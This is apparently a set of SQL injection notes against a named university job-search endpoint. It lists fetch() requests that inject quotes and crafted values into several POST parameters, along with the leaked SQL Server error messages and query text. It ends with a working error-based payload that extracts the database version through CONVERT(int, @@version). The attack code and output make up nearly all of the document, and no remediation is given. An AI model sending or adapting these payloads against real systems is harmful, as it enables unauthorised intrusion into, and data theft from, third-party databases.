1. SchoolType

```ts
fetch("http://spirit.tku.edu.tw:8088/job/company/search_data_ok.php", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "SchoolType='",
  method: "POST",
  mode: "cors",
  credentials: "omit",
});
```

string(109) "SQLSTATE[42000]: [Microsoft][SQL Server Native Client 10.0][SQL Server]接近 ')' 之處的語法不正確。"
string(316) "

```sql
select Id
from Job A
 where ()/0.0 >= 0.5
order by (select case IsClosed when 0 then 1 when 1 then 2 end)
		, (select case when ExpiredDate is null then '2100-01-01' else ExpiredDate end) desc
		, (select case when CompanyId=0 then '' else (select ShortName from Company where Id=A.CompanyId) end)
		, Id
		"
....
```

2. PayType

```ts

```

string(112) "SQLSTATE[42000]: [Microsoft][SQL Server Native Client 10.0][SQL Server]接近 '2100' 之處的語法不正確。"
string(363) "

```sql
select Id
from Job A
 where ((select case when PayType=''' then  else 0 end))/0.0 >= 0.5
order by (select case IsClosed when 0 then 1 when 1 then 2 end)
		, (select case when ExpiredDate is null then '2100-01-01' else ExpiredDate end) desc
		, (select case when CompanyId=0 then '' else (select ShortName from Company where Id=A.CompanyId) end)
		, Id
		"
```

3. JobTags1

```ts
fetch("http://spirit.tku.edu.tw:8088/job/company/search_data_ok.php", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "JobTags1=1",
  method: "POST",
  mode: "cors",
  credentials: "omit",
});
```

string(121) "SQLSTATE[42000]: [Microsoft][SQL Server Native Client 10.0][SQL Server]接近關鍵字 'else' 之處的語法不正確。"
string(362) "

```sql
select Id
from Job A
 where ((select case when (IsFull=1) then  else 0 end))/0.0 >= 0.5
order by (select case IsClosed when 0 then 1 when 1 then 2 end)
		, (select case when ExpiredDate is null then '2100-01-01' else ExpiredDate end) desc
		, (select case when CompanyId=0 then '' else (select ShortName from Company where Id=A.CompanyId) end)
		, Id
		"
....
```

4. WorkTimeType

```ts
fetch("http://spirit.tku.edu.tw:8088/job/company/search_data_ok.php", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "WorkTimeType='",
  method: "POST",
  mode: "cors",
  credentials: "omit",
});
```

string(112) "SQLSTATE[42000]: [Microsoft][SQL Server Native Client 10.0][SQL Server]接近 '2100' 之處的語法不正確。"
string(368) "

```sql
select Id
from Job A
 where ((select case when WorkTimeType=''' then  else 0 end))/0.0 >= 0.5
order by (select case IsClosed when 0 then 1 when 1 then 2 end)
		, (select case when ExpiredDate is null then '2100-01-01' else ExpiredDate end) desc
		, (select case when CompanyId=0 then '' else (select ShortName from Company where Id=A.CompanyId) end)
		, Id
		"
....
```

5.

```js
fetch("http://spirit.tku.edu.tw:8088/job/company/search_data_ok.php", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `PayType=${encodeURIComponent(`123' then 1 else 0 end))/0.0 >= 0.5 AND 1=CONVERT(int, @@version)--`)}`,
  method: "POST",
  mode: "cors",
  credentials: "omit",
});
```

string(347) "SQLSTATE[22018]: [Microsoft][SQL Server Native Client 10.0][SQL Server]將 nvarchar 值 'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (Intel X86)
Apr 2 2010 15:53:02
Copyright (c) Microsoft Corporation
Enterprise Edition on Windows NT 5.2 <X86> (Build 3790: Service Pack 2) (Hypervisor)
' 轉換成資料類型 int 時，轉換失敗。"
string(429) "

```sql
select Id
from Job A
 where ((select case when PayType='123' then 1 else 0 end))/0.0 >= 0.5 AND 1=CONVERT(int, @@version)--' then  else 0 end))/0.0 >= 0.5
order by (select case IsClosed when 0 then 1 when 1 then 2 end)
		, (select case when ExpiredDate is null then '2100-01-01' else ExpiredDate end) desc
		, (select case when CompanyId=0 then '' else (select ShortName from Company where Id=A.CompanyId) end)
		, Id
		"
....
```
